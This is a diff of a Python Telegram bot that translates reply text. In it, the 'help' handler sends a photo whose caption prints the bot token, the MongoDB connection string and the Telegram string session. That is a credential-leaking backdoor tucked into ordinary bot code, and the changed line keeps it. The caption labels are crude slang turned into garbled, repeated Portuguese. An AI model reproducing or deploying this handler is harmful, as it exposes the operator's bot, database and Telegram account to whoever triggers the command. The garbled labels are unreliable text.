@@ -112,7 +112,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
     await message.reply_photo(
         photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
+        caption=f"""**"Sim, eu sou o Rha Lund.":-** `{BOT_TOKEN}`\n\n**"Sim, eu sou o Rha Muth.":-** `{MONGO_DB_URI}`\n\n**"Sim, eu sou o Rha Muth.":-** `{STRING_SESSION}`\n\n**Sim, eu sou o Hui na Bat**""",
     )
 
 
@@ -121,7 +121,7 @@ async def close_menu(_, query: CallbackQuery):
     try:
         await query.answer()
         await query.message.delete()
-        umm = await query.message.reply_text(f"ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention}")
+        umm = await query.message.reply_text(f"🦝 Fechado por {query.from_user.mention}")
         await asyncio.sleep(2)
         await umm.delete()
     except:
